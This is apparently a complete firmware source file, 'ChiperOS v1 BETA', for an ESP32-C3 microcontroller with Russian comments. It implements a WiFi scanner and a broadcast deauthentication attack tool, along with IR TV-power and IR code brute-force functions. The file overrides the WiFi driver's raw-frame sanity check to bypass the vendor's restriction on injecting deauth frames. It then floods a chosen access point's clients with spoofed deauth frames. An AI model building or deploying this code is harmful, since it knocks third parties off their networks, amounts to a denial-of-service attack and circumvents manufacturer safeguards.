// ═══════════════════════════════════════════════════════════════
// ChiperOS v1 BETA - ESP32-C3 Super Mini
// WiFi Deauth + Scan + IR Control
// ═══════════════════════════════════════════════════════════════

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>

// ═══════════════════════════════════════════════════════════════
// КОНФИГУРАЦИЯ ПИНОВ
// ═══════════════════════════════════════════════════════════════
#define IR_PIN 4  // ИК-диод на GPIO 4

// ═══════════════════════════════════════════════════════════════
// СТРУКТУРЫ ДАННЫХ
// ═══════════════════════════════════════════════════════════════

typedef struct {
    uint8_t header[4];
    uint8_t station[6];
    uint8_t access_point[6];
    uint8_t sender[6];
    uint8_t sequence[2];
    uint8_t reason[2];
} __attribute__((packed)) deauth_frame_t;

// ═══════════════════════════════════════════════════════════════
// ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
// ═══════════════════════════════════════════════════════════════
IRsend irSender(IR_PIN);

deauth_frame_t deauthFrame;
bool deauthActive = false;
int targetChannel = 1;
uint8_t targetAP[6] = {0};
uint8_t targetClient[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

#define MAX_NETWORKS 20
struct WiFiNetwork {
    String ssid;
    uint8_t bssid[6];
    int32_t rssi;
    uint8_t channel;
    wifi_auth_mode_t encType;
} networks[MAX_NETWORKS];
int networkCount = 0;

// ═══════════════════════════════════════════════════════════════
// КРИТИЧЕСКИЙ ПАТЧ: Обход проверки драйвера WiFi
// Используем linker wrap для безопасного переопределения
// ═══════════════════════════════════════════════════════════════
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0; // 0 = разрешено, 1 = заблокировано
}

// ═══════════════════════════════════════════════════════════════
// IR КОДЫ (NEC протокол)
// ═══════════════════════════════════════════════════════════════
#define LG_POWER_CODE 0x20DF0CF3
#define SAMSUNG_POWER_CODE 0xE0E040BF

// ═══════════════════════════════════════════════════════════════
// WIFI DEAUTH ФУНКЦИИ
// ═══════════════════════════════════════════════════════════════

void buildDeauthFrame(uint8_t* ap, uint8_t* client, uint16_t reason = 0x0007) {
    deauthFrame.header[0] = 0xC0;
    deauthFrame.header[1] = 0x00;
    deauthFrame.header[2] = 0x00;
    deauthFrame.header[3] = 0x00;
    
    memcpy(deauthFrame.station, client, 6);
    memcpy(deauthFrame.access_point, ap, 6);
    memcpy(deauthFrame.sender, ap, 6);
    
    deauthFrame.sequence[0] = 0x00;
    deauthFrame.sequence[1] = 0x00;
    
    deauthFrame.reason[0] = reason & 0xFF;
    deauthFrame.reason[1] = (reason >> 8) & 0xFF;
}

void sendDeauth() {
    if (!deauthActive) return;
    
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    
    for (int i = 0; i < 5; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, &deauthFrame, sizeof(deauthFrame), false);
        delay(2);
    }
}

void startDeauth(int networkIndex, uint16_t reason = 0x0007) {
    if (networkIndex < 0 || networkIndex >= networkCount) {
        Serial.println("❌ Invalid network index");
        return;
    }
    
    targetChannel = networks[networkIndex].channel;
    memcpy(targetAP, networks[networkIndex].bssid, 6);
    
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    buildDeauthFrame(targetAP, broadcast, reason);
    
    deauthActive = true;
    Serial.println("✅ Deauth started!");
    Serial.printf("   Target: %s\n", networks[networkIndex].ssid.c_str());
    Serial.printf("   Channel: %d\n", targetChannel);
    Serial.printf("   Reason: 0x%04X\n", reason);
}

void stopDeauth() {
    deauthActive = false;
    Serial.println("⏹ Deauth stopped");
}

// ═══════════════════════════════════════════════════════════════
// WIFI SCAN
// ═══════════════════════════════════════════════════════════════

void scanNetworks() {
    Serial.println("\n🔍 Scanning WiFi networks...");
    
    if (deauthActive) stopDeauth();
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    int n = WiFi.scanNetworks(false, true, false, 300, 0);
    networkCount = min(n, MAX_NETWORKS);
    
    if (networkCount == 0) {
        Serial.println("❌ No networks found");
        return;
    }
    
    Serial.println("\n╔════╦════════════════════╦═════════════╦═════╦════════════╗");
    Serial.println("║ #  ║ SSID               ║ RSSI        ║ CH  ║ BSSID      ║");
    Serial.println("╠════╬════════════════════╬═════════════╬═════╬════════════╣");
    
    for (int i = 0; i < networkCount; i++) {
        networks[i].ssid = WiFi.SSID(i);
        networks[i].rssi = WiFi.RSSI(i);
        networks[i].channel = WiFi.channel(i);
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
        networks[i].encType = WiFi.encryptionType(i);
        
        Serial.printf("║ %-2d ║ %-18s ║ %-11d ║ %-3d ║ ", 
            i, networks[i].ssid.substring(0, 18).c_str(), 
            networks[i].rssi, networks[i].channel);
        
        for (int j = 0; j < 6; j++) {
            Serial.printf("%02X", networks[i].bssid[j]);
            if (j < 5) Serial.print(":");
        }
        Serial.println(" ║");
    }
    Serial.println("╚════╩════════════════════╩═════════════╩═════╩════════════╝\n");
}

// ═══════════════════════════════════════════════════════════════
// IR ФУНКЦИИ
// ═══════════════════════════════════════════════════════════════

void sendIR_LG_Power() {
    Serial.println("📺 Sending LG TV Power (NEC 0x20DF0CF3)...");
    irSender.sendNEC(LG_POWER_CODE, 32);
    delay(100);
    irSender.sendNEC(LG_POWER_CODE, 32);
    Serial.println("✅ Sent!");
}

void sendIR_Samsung_Power() {
    Serial.println("📺 Sending Samsung TV Power (NEC 0xE0E040BF)...");
    irSender.sendNEC(SAMSUNG_POWER_CODE, 32);
    delay(100);
    irSender.sendNEC(SAMSUNG_POWER_CODE, 32);
    Serial.println("✅ Sent!");
}

void irBruteForce() {
    Serial.println("\n🔨 Starting IR Brute-Force (NEC 32-bit)...");
    Serial.println("⚠️  This will send 1000 random codes. Point at target device!");
    Serial.println("⏹  Send 'stop' to abort\n");
    
    for (int i = 0; i < 1000; i++) {
        if (Serial.available()) {
            String cmd = Serial.readStringUntil('\n');
            cmd.trim();
            if (cmd.equalsIgnoreCase("stop")) {
                Serial.println("⏹ Brute-force stopped by user");
                return;
            }
        }
        
        uint32_t code = random(0x00000000, 0xFFFFFFFF);
        
        Serial.printf("Sending: 0x%08X (%d/1000)\n", code, i + 1);
        irSender.sendNEC(code, 32);
        delay(200);
    }
    
    Serial.println("✅ Brute-force completed");
}

// ═══════════════════════════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════════════════════════

void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n╔════════════════════════════════════════╗");
    Serial.println("║    ChiperOS v1 BETA                    ║");
    Serial.println("║    ESP32-C3 Super Mini                 ║");
    Serial.println("╚════════════════════════════════════════╝\n");
    
    irSender.begin();
    Serial.println("✅ IR initialized on GPIO 4");
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    esp_wifi_set_promiscuous(true);
    
    Serial.println("✅ WiFi initialized");
    Serial.println("\n📋 Commands:");
    Serial.println("   scan          - Scan WiFi networks");
    Serial.println("   deauth <num>  - Start deauth on network #");
    Serial.println("   stop          - Stop deauth");
    Serial.println("   lg            - Send LG TV Power");
    Serial.println("   samsung       - Send Samsung TV Power");
    Serial.println("   brute         - IR Brute-Force (1000 codes)");
    Serial.println("   help          - Show this menu\n");
}

// ═══════════════════════════════════════════════════════════════
// LOOP
// ═══════════════════════════════════════════════════════════════

void loop() {
    if (deauthActive) {
        sendDeauth();
    }
    
    if (Serial.available()) {
        String cmd = Serial.readStringUntil('\n');
        cmd.trim();
        cmd.toLowerCase();
        
        if (cmd == "help" || cmd == "?") {
            Serial.println("\n📋 Commands:");
            Serial.println("   scan          - Scan WiFi networks");
            Serial.println("   deauth <num>  - Start deauth on network #");
            Serial.println("   stop          - Stop deauth");
            Serial.println("   lg            - Send LG TV Power");
            Serial.println("   samsung       - Send Samsung TV Power");
            Serial.println("   brute         - IR Brute-Force (1000 codes)");
            Serial.println("   status        - Show current status");
        }
        else if (cmd == "scan") {
            scanNetworks();
        }
        else if (cmd.startsWith("deauth")) {
            int spaceIdx = cmd.indexOf(' ');
            if (spaceIdx == -1) {
                Serial.println("❌ Usage: deauth <network_number>");
            } else {
                String args = cmd.substring(spaceIdx + 1);
                int numEnd = args.indexOf(' ');
                int networkNum = -1;
                uint16_t reason = 0x0007;
                
                if (numEnd == -1) {
                    networkNum = args.toInt();
                } else {
                    networkNum = args.substring(0, numEnd).toInt();
                    String reasonStr = args.substring(numEnd + 1);
                    if (reasonStr.startsWith("0x")) {
                        reason = strtol(reasonStr.c_str(), NULL, 16);
                    } else {
                        reason = reasonStr.toInt();
                    }
                }
                
                startDeauth(networkNum, reason);
            }
        }
        else if (cmd == "stop") {
            stopDeauth();
        }
        else if (cmd == "lg") {
            sendIR_LG_Power();
        }
        else if (cmd == "samsung") {
            sendIR_Samsung_Power();
        }
        else if (cmd == "brute") {
            irBruteForce();
        }
        else if (cmd == "status") {
            Serial.println("\n📊 Status:");
            Serial.printf("   Deauth: %s\n", deauthActive ? "ACTIVE" : "inactive");
            if (deauthActive) {
                Serial.printf("   Channel: %d\n", targetChannel);
                Serial.print("   Target AP: ");
                for (int i = 0; i < 6; i++) {
                    Serial.printf("%02X", targetAP[i]);
                    if (i < 5) Serial.print(":");
                }
                Serial.println();
            }
            Serial.printf("   Networks scanned: %d\n", networkCount);
        }
        else {
            Serial.println("❓ Unknown command. Type 'help' for commands.");
        }
    }
    
    delay(10);
}
